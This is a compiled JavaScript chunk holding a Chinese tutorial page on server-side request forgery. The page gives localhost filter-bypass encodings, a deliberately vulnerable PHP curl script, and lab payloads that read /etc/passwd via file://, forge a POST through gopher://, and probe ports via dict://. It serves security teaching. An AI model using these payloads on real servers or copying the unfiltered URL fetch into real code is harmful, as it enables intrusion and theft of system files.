(window.webpackJsonp=window.webpackJsonp||[]).push([[29],{395:function(s,a,t){"use strict";t.r(a);var e=t(45),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"ssrf服务器端请求伪造"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssrf服务器端请求伪造"}},[s._v("#")]),s._v(" SSRF服务器端请求伪造")]),s._v(" "),t("p",[t("code",[s._v("SSRF")]),s._v("服务端请求伪造漏洞，也称为"),t("code",[s._v("XSPA")]),s._v("跨站端口攻击，是一种由攻击者构造一定的利用代码导致服务端发起漏洞利用请求的安全漏洞，一般情况下"),t("code",[s._v("SSRF")]),s._v("攻击的应用是无法通过外网访问的，所以需要借助目标服务端进行发起，目标服务器可以链接内网和外网，攻击者便可以通过目标主机攻击内网应用。")]),s._v(" "),t("h2",{attrs:{id:"描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#描述"}},[s._v("#")]),s._v(" 描述")]),s._v(" "),t("p",[t("code",[s._v("SSRF")]),s._v("是利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，通常攻击者通过伪造服务器请求与内网进行交互，从而达到探测内网，对内网进行攻击的目的，通常与多种攻击方式相结合。服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似，例如处在域中的浏览器可作为攻击者的代理。"),t("br"),s._v("\n在一些情况下由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多情况下认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网，在"),t("code",[s._v("SSRF")]),s._v("漏洞面前这些漏洞都会造成很大危害。"),t("code",[s._v("SSRF")]),s._v("漏洞一般为"),t("code",[s._v("HTTP／HTTPS")]),s._v("方式出现，但类似"),t("code",[s._v("TCP Connect")]),s._v("方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。")]),s._v(" "),t("h3",{attrs:{id:"ssrf漏洞易出现的场景"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssrf漏洞易出现的场景"}},[s._v("#")]),s._v(" SSRF漏洞易出现的场景")]),s._v(" "),t("p",[s._v("能够对外发起网络请求的地方，就可能存在"),t("code",[s._v("SSRF")]),s._v("漏洞。")]),s._v(" "),t("ul",[t("li",[s._v("从远程服务器请求资源"),t("code",[s._v("Upload from URL，Import & Export RSS Feed")]),s._v("。")]),s._v(" "),t("li",[s._v("数据库内置功能"),t("code",[s._v("Oracle、MongoDB、MSSQL、Postgres、CouchDB")]),s._v("。")]),s._v(" "),t("li",[t("code",[s._v("Webmail")]),s._v("收取其他邮箱邮件"),t("code",[s._v("POP3、IMAP、SMTP")]),s._v("。")]),s._v(" "),t("li",[s._v("文件处理、编码处理、属性信息处理"),t("code",[s._v("ffmpeg、ImageMagic、DOCX、PDF、XML")]),s._v("。")]),s._v(" "),t("li",[s._v("通过"),t("code",[s._v("URL")]),s._v("地址分享页面。")]),s._v(" "),t("li",[s._v("未公开的"),t("code",[s._v("api")]),s._v("实现以及其他调用"),t("code",[s._v("URL")]),s._v("的功能。")])]),s._v(" "),t("h3",{attrs:{id:"ssrf漏洞的利用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssrf漏洞的利用"}},[s._v("#")]),s._v(" SSRF漏洞的利用")]),s._v(" "),t("ul",[t("li",[s._v("可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的"),t("code",[s._v("banner")]),s._v("信息。")]),s._v(" "),t("li",[s._v("攻击运行在内网或本地的应用程序，比如溢出。")]),s._v(" "),t("li",[s._v("对内网"),t("code",[s._v("web")]),s._v("应用进行指纹识别，通过访问默认文件实现。")]),s._v(" "),t("li",[s._v("攻击内外网的"),t("code",[s._v("web")]),s._v("应用，主要是使用"),t("code",[s._v("GET")]),s._v("参数就可以实现的攻击，比如"),t("code",[s._v("Struts2")]),s._v("、"),t("code",[s._v("sqli")]),s._v("等。")]),s._v(" "),t("li",[s._v("利用"),t("code",[s._v("file")]),s._v("协议读取本地文件等。")])]),s._v(" "),t("h3",{attrs:{id:"绕过方式"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#绕过方式"}},[s._v("#")]),s._v(" 绕过方式")]),s._v(" "),t("h4",{attrs:{id:"攻击本机"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#攻击本机"}},[s._v("#")]),s._v(" 攻击本机")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://127.0.0.1:80\nhttp://localhost:22\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h4",{attrs:{id:"利用-绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用-绕过"}},[s._v("#")]),s._v(" 利用@绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://example.com@127.0.0.1\n# 这里的example.com可以任意替换，\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h4",{attrs:{id:"利用短地址绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用短地址绕过"}},[s._v("#")]),s._v(" 利用短地址绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://127.0.0.1可以变为http://suo.im/5UHEvD\n# 转换地址有很多，可以采用http://tool.chinaz.com/tools/dwz.aspx\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h4",{attrs:{id:"特殊域名绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#特殊域名绕过"}},[s._v("#")]),s._v(" 特殊域名绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://127.0.0.1.xip.io/\nhttp://www.margin.com.127.0.0.1.xip.io/\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h4",{attrs:{id:"利用enclosed-alphanumerics"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用enclosed-alphanumerics"}},[s._v("#")]),s._v(" 利用Enclosed alphanumerics")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("h4",{attrs:{id:"利用句号代替点绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#利用句号代替点绕过"}},[s._v("#")]),s._v(" 利用句号代替点绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("127.0.0.1 变为127。0。0。1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h4",{attrs:{id:"使用其他进制绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用其他进制绕过"}},[s._v("#")]),s._v(" 使用其他进制绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("127.0.0.1\n8进制格式：0177.0.0.1\n16进制格式：0x7F.0.0.1\n10进制整数格式：2130706433（转16进制，再转10进制）\n16进制整数格式：0x7F000001\n还有一种特殊的省略模式，例如127.0.0.1这个IP可以写成127.1、10.0.0.1这个IP可以写成10.1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("h4",{attrs:{id:"特殊域名绕过-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#特殊域名绕过-2"}},[s._v("#")]),s._v(" 特殊域名绕过")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("DNS解析\nhttp://127.0.0.1.xip.io/\n# 会解析到本地的127.0.0.1\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"实验靶机示例"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#实验靶机示例"}},[s._v("#")]),s._v(" 实验靶机示例")]),s._v(" "),t("p",[s._v("使用"),t("code",[s._v("PHP")]),s._v("构建靶机作为示例，编写如下代码"),t("code",[s._v("test.php")]),s._v("，实际上避免这类攻击的重要原则就是过滤用户输入即永远不要相信用户的输入。")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 创建一个新curl资源")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_init")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 设置URL和相应的选项")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_URL")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'url'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_setopt")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CURLOPT_HEADER")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 抓取URL并把它传递给浏览器")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_exec")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//关闭cURL资源，并且释放系统资源")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_close")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ch")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("h3",{attrs:{id:"file协议的运用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#file协议的运用"}},[s._v("#")]),s._v(" file协议的运用")]),s._v(" "),t("p",[s._v("在上述示例中发起一个"),t("code",[s._v("GET")]),s._v("请求便可以获取敏感文件的信息。")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://192.168.163.150/test.php?url=file:///etc/passwd\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"gopher协议的运用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#gopher协议的运用"}},[s._v("#")]),s._v(" gopher协议的运用")]),s._v(" "),t("p",[t("code",[s._v("gopher")]),s._v("协议是比"),t("code",[s._v("http")]),s._v("协议更早出现的协议，现在已经不常用了，但是在"),t("code",[s._v("SSRF")]),s._v("漏洞利用中"),t("code",[s._v("gopher")]),s._v("可以说是万金油，因为可以使用"),t("code",[s._v("gopher")]),s._v("发送各种格式的请求包，这样变可以解决漏洞点不在"),t("code",[s._v("GET")]),s._v("参数的问题了。"),t("br"),s._v("\n基本协议格式："),t("code",[s._v("URL:gopher://<host>:<port>/<gopher-path>")]),s._v("。"),t("br"),s._v("\n进行如下请求可以发送一个"),t("code",[s._v("POST")]),s._v("请求，且参数"),t("code",[s._v("cmd")]),s._v("的值为"),t("code",[s._v("balabal")]),s._v("，这里构造"),t("code",[s._v("gopher")]),s._v("请求的时候，回车换行符号要进行"),t("code",[s._v("2")]),s._v("次"),t("code",[s._v("url")]),s._v("编码"),t("code",[s._v("%250d%250a")]),s._v("。")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://192.168.163.150/test.php?url=gopher://192.168.163.1:80/_POST%20/evil.php%20HTTP/1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl/7.43.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=balabala\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"dict协议应用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dict协议应用"}},[s._v("#")]),s._v(" dict协议应用")]),s._v(" "),t("p",[t("code",[s._v("dict")]),s._v("协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在"),t("code",[s._v("SSRF")]),s._v("中如果可以使用"),t("code",[s._v("dict")]),s._v("协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("http://192.168.163.150/test.php?url=dict://192.168.163.1:3306/info \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"每日一题"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#每日一题"}},[s._v("#")]),s._v(" 每日一题")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("https://github.com/WindrunnerMax/EveryDay\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"参考"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#参考"}},[s._v("#")]),s._v(" 参考")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("https://zhuanlan.zhihu.com/p/116039804\nhttps://www.freebuf.com/column/157466.html\nhttps://juejin.cn/post/6844903824948199431\nhttps://www.cnblogs.com/bmjoker/p/9614789.html\nhttps://blog.csdn.net/nz9611/article/details/96011013\nhttps://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])])])}),[],!1,null,null,null);a.default=n.exports}}]);